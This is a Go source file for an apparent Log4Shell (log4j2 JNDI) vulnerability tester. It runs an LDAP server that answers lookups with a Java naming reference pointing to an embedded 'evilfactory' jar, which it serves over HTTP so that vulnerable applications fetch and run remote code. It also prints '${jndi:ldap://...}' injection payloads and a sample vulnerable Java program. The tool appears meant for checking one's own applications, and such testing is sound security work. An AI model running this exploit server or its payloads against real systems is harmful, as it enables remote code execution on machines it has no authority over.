package main

import (
	"embed"
	"flag"
	"fmt"
	"github.com/logrusorgru/aurora"
	"github.com/lor00x/goldap/message"
	ldap "github.com/vjeantet/ldapserver"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
)

//go:embed evilfactory-1.0-SNAPSHOT.jar
var jar embed.FS

var publicHost string

func main() {
	flag.StringVar(&publicHost, "publicIp", os.Getenv("publicIp"), "Usage:$ log4shell-ldap --publicIp 192.168.1.1")
	flag.Parse()

	printUsage()
	ldapServer := startLdapServer()
	startHttpServer()

	ch := make(chan os.Signal, 2)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)
	ldapServer.Stop()
}

func printUsage() {
	var ip string
	if publicHost == "" {
		ip = "<IP>"
		if isRunningInDockerContainer() {
			fmt.Println(aurora.Red("It appears this tool is running inside a container and no public IP has been set! ❌"))
			fmt.Println(aurora.Red("The tool requires public IP to be set explicitly when running in a container! ❌"))
			fmt.Printf("%s %s ℹ️\n", aurora.Green("Example usage:"), aurora.Yellow("docker run -p 3000:3000 -p 1389:1389 -e publicIp=192.168.1.1 log4shell"))
			fmt.Printf("%s ❌\n", aurora.Red("It's important to map the ports to the same port numbers on the host computer. If you remap them to other ports then the tool might not work reliably!"))
			os.Exit(1)
		} else {
			fmt.Printf("It appears the tool is %s running inside a container and no public IP has been explicitly set! ⚠️\n", aurora.Red("NOT"))
			fmt.Printf("The tool will try to deduce what IP to include in LDAP response by checking local IP in incoming LDAP connections.\n")
			fmt.Printf("%s ⚠️\n", aurora.Red("This might not work reliably and it's recommended to explicit set public IP!"))
			fmt.Printf("Hint: You can set an explicit public IP by passing the %s flag ℹ️\n", aurora.Blue("--publicIp"))
			fmt.Printf("Example: %s\n", aurora.Blue("./log4shell-ldap --publicIp 192.168.1.1"))
			fmt.Printf("Detected following IP addresses: %s\n", aurora.Blue(strings.Join(getIpv4Addresses(), ", ")))
		}
	} else {
		ip = publicHost
		fmt.Printf("Public IP address explicitly set to %s ✅\n", aurora.Blue(publicHost))
	}
	fmt.Printf("Test connectivity by executing %s from the same computer where the target application is running ℹ️\n", aurora.Blue(fmt.Sprintf("curl http://%s:3000", ip)))
	fmt.Println("----")
	fmt.Printf("Usage: Make log4j2 to print %s ℹ️\n", aurora.Blue(fmt.Sprintf("${jndi:ldap://%s:1389/probably_not_vulnerable}", ip)))
	fmt.Println("Example Java Application: ")
	fmt.Println(aurora.Yellow(fmt.Sprintf(`package mypackage;

import org.apache.logging.log4j.LogManager;

public class Main {
    public static void main(String[] args) throws Exception {
        LogManager.getLogger(Main.class).fatal("${jndi:ldap://%s:1389/probably_not_vulnerable}");
    }
}`, ip)))
	fmt.Println()
	fmt.Printf("There are 3 possible outcomes:\n")
	fmt.Printf(`1. The application prints %s. This is happening when a vulnerable log4j2 version is executed on old Java.") 
   This is the worst case as it allows a very simple arbitrary remote code execution."
2. The application prints %s. This means a vulnerable log4j2 version is executed on recent Java. 
   This makes it a bit harder to abuse the vulnerability, but RCE may still be possible and there is also a risk of DoS.
3. The application prints %s 
   This means the application is either not vulnerable or the test is misconfigured :)
`, aurora.Blue("totally pwned!"), aurora.Blue("Reference Class Name: probably vulnerable"), aurora.Blue(fmt.Sprintf("${jndi:ldap://%s:1389/probably_not_vulnerable}", ip)))
}

func startLdapServer() *ldap.Server {
	ldap.Logger = log.New(ioutil.Discard, "", log.LstdFlags)
	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Search(handleSearch)
	routes.Bind(handleBind)
	server.Handle(routes)
	go func() {
		err := server.ListenAndServe("0.0.0.0:1389")
		if err != nil {
			panic(err)
		}
	}()
	return server
}

func getIpv4Addresses() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		panic(err)
	}

	var result []string
	for _, addr := range addrs {
		address := strings.Split(addr.String(), "/")[0]
		if address != "127.0.0.1" && !strings.Contains(address, "::") {
			result = append(result, address)
		}
	}
	return result
}

func isRunningInDockerContainer() bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}
	return false
}

func handleIndex(w http.ResponseWriter, req *http.Request) {
	w.WriteHeader(http.StatusOK)
	host := req.Host
	host = strings.Split(host, ":")[0]
	ldapUrl := aurora.Green(fmt.Sprintf("${jndi:ldap://%s:1389/probably_not_vulnerable}", host))
	io.WriteString(w, fmt.Sprintf("To test an application make log4j to print %s\n", ldapUrl))
}

func startHttpServer() {
	var staticFS = http.FS(jar)
	fs := http.FileServer(staticFS)
	http.Handle("/evilfactory-1.0-SNAPSHOT.jar", fs)
	http.HandleFunc("/", handleIndex)
	go func() {
		err := http.ListenAndServe(":3000", nil)
		if err != nil {
			panic(err)
		}
	}()
}

func getOwnAddress(m *ldap.Message) string {
	if publicHost != "" {
		return publicHost
	}
	return strings.Split(m.Client.GetConn().LocalAddr().String(), ":")[0]
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()
	select {
	case <-m.Done:
		log.Print("Leaving handleSearch...")
		return
	default:
	}
	fmt.Printf("Received request from %s\n", aurora.Green(m.Client.GetConn().RemoteAddr()))
	codebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/evilfactory-1.0-SNAPSHOT.jar", getOwnAddress(m)))
	e := ldap.NewSearchResultEntry("cn=pwned, " + string(r.BaseObject()))
	e.AddAttribute("cn", "pwned")
	e.AddAttribute("javaClassName", "probably vulnerable")
	e.AddAttribute("javaCodeBase", codebase)
	e.AddAttribute("objectclass", "javaNamingReference")
	e.AddAttribute("javaFactory", "info.jerrinot.log4shell.evilfactory.EvilFactory")
	w.Write(e)

	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}
